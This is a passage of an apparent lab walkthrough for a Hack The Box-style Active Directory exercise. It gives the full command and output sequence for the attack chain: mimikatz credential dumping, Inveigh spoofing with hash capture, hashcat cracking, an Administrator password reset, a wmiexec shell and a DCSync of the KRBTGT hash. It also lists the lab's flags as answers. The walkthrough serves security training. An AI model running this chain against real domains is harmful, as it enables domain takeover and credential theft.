cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe mimikatz64.exe
scp mimikatz64.exe htb-student@STMIP:/home/htb-student/Desktop
```

Then using the meterpreter session, upload mimikatz:

```
(Meterpreter 1)(C:\) > upload mimikatz64.exe

[*] uploading  : /home/htb-student/Desktop/mimikatz64.exe -> mimikatz64.exe
[*] Uploaded 1.25 MiB of 1.25 MiB (100.0%): /home/htb-student/Desktop/mimikatz64.exe -> mimikatz64.exe
[*] uploaded   : /home/htb-student/Desktop/mimikatz64.exe -> mimikatz64.exe
```

```
(Meterpreter 1)(C:\) > shell

Process 2608 created.
Channel 9 created.
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>mimikatz64.exe
mimikatz64.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

<SNIP>

Authentication Id : 0 ; 213027 (00000000:00034023)
Session           : Interactive from 1
User Name         : mssqlsvc
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 12/12/2022 8:20:40 AM
SID               : S-1-5-21-3327542485-274640656-2609762496-4613
	msv :	
	 [00000003] Primary
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 8c9555327d95f815987c0d81238c7660
	 * SHA1     : 0a8d7e8141b816c8b20b4762da5b4ee7038b515c
	 * DPAPI    : a1568414db09f65c238b7557bc3ceeb8
	tspkg :	
	wdigest :	
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT
	 * Password : (null)
	kerberos :	
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT.LOCAL
	 * Password : Sup3rS3cur3maY5ql$3rverE
```

Move laterally to the next machine, authenticating to 172.16.7.50 as `mssqlsvc:Sup3rS3cur3maY5ql$3rverE`:

```
xfreerdp /v:172.16.7.50 /u:mssqlsvc /p:'Sup3rS3cur3maY5ql$3rverE' /dynamic-resolution
```
<img width="759" height="344" alt="image" src="https://github.com/user-attachments/assets/332d933e-57b0-43da-9351-d07c14d2927a" />

flag = `exc3ss1ve_adm1n_r1ights!`

Download Inveigh.ps1 and transfer it over to MS01:

```
wget -q https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 && scp Inveigh.ps1 htb-student@10.129.73.75:/home/htb-student/Desktop

htb-student@10.129.73.75's password: 
Inveigh.ps1    
```

```
PS C:\Users\mssqlsvc\Desktop> Import-Module .\Inveigh.ps1
PS C:\Users\mssqlsvc\Desktop> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

[*] Inveigh 1.506 started at 2022-11-29T14:24:15
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.7.50
[+] Spoofer IP Address = 172.16.7.50
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled

<SNIP>

[*] Press any key to stop console output
[+] [2022-11-29T14:24:27] TCP(445) SYN packet detected from 172.16.7.3:51009
[+] [2022-11-29T14:24:27] SMB(445) negotiation request detected from 172.16.7.3:51009
[+] [2022-11-29T14:24:27] SMB(445) NTLM challenge F8059BA109C97E0D sent to 172.16.7.3:51009
[+] [2022-11-29T14:24:27] SMB(445) NTLMv2 captured for INLANEFREIGHT\CT059 from 172.16.7.3(DC01):51009:
CT059::INLANEFREIGHT:F8059BA109C97E0D:78A41190201430E8654DE55727DF7EB5:010100000000000089A153943004D901BDD5DA8680F87B870000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080089A153943004D901060004000200000008003000300000000000000000000000002000007A0B42C80CDAF1780F6DFBD615855858C454CE6D589CE7368945318F68520DD80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
```

Crack the hash found using hashcat: 

<img width="1195" height="434" alt="image" src="https://github.com/user-attachments/assets/e9fc4fe6-bf3c-4da9-ba7b-e6e895766996" />

```
hashcat -m 5600 ct509.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
<snip >
* Keyspace..: 14344385

CT059::INLANEFREIGHT:f8059ba109c97e0d:78a41190201430e8654de55727df7eb5:010100000000000089a153943004d901bdd5da8680f87b870000000002001a0049004e004c0041004e0045004600520045004900470048005400010008004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00030030004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000700080089a153943004d901060004000200000008003000300000000000000000000000002000007a0b42c80cdaf1780f6dfbd615855858c454ce6d589ce7368945318f68520dd80a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0037002e0035003000000000000000000000000000:charlie1   <============
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: CT059::INLANEFREIGHT:f8059ba109c97e0d:78a4119020143...000000
Time.Started.....: Sun Sep 21 22:59:39 2025 (0 secs)
Time.Estimated...: Sun Sep 21 22:59:39 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1039.5 kH/s (1.05ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: 123456 -> lovers1

Started: Sun Sep 21 22:59:38 2025
Stopped: Sun Sep 21 22:59:41 2025

```

password = `charlie1`

Authenticate as CT059:charlie1 to 172.16.7.50:

```
xfreerdp /v:172.16.7.50 /u:CT059 /p:charlie1 /dynamic-resolution
```

Bloodhound data will identify the final phase of the attack chain. The CT059 user has GenericAll rights over the Domain Admins group:

<img width="749" height="329" alt="image" src="https://github.com/user-attachments/assets/b72e5326-be3c-4326-805c-3b1503f7f233" />

<img width="763" height="540" alt="image" src="https://github.com/user-attachments/assets/af32d8e1-fbe2-49ef-ab38-aaf94ad94f14" />


Add the CT059 user to the Domain Administrators group or alternatively change the administrator's password to Welcome1:

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\CT059> net user Administrator Welcome1 /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

The command completed successfully.
```

wmiexec.py will be used to connect to DC01 and print out the flag file:

```
└──╼ $wmiexec.py administrator@172.16.7.3

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>type C:\Users\administrator\desktop\flag.txt

acLs_f0r_th3_w1n!
```

DCSync the KRBTGT NTLM hash with secretsdump.py:

```
secretsdump.py administrator@172.16.7.3 -just-dc-user KRBTGT

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:b043a263ca018cee4abe757dea38e2cee7a42cc56ccb467c0639663202ddba91
krbtgt:aes128-cts-hmac-sha1-96:e1fe1e9e782036060fb7cbac23c87f9d
krbtgt:des-cbc-md5:e0a7fbc176c28a37
[*] Cleaning up...
```

`7eba70412d81c1cd030d72a3e8dbe05f`











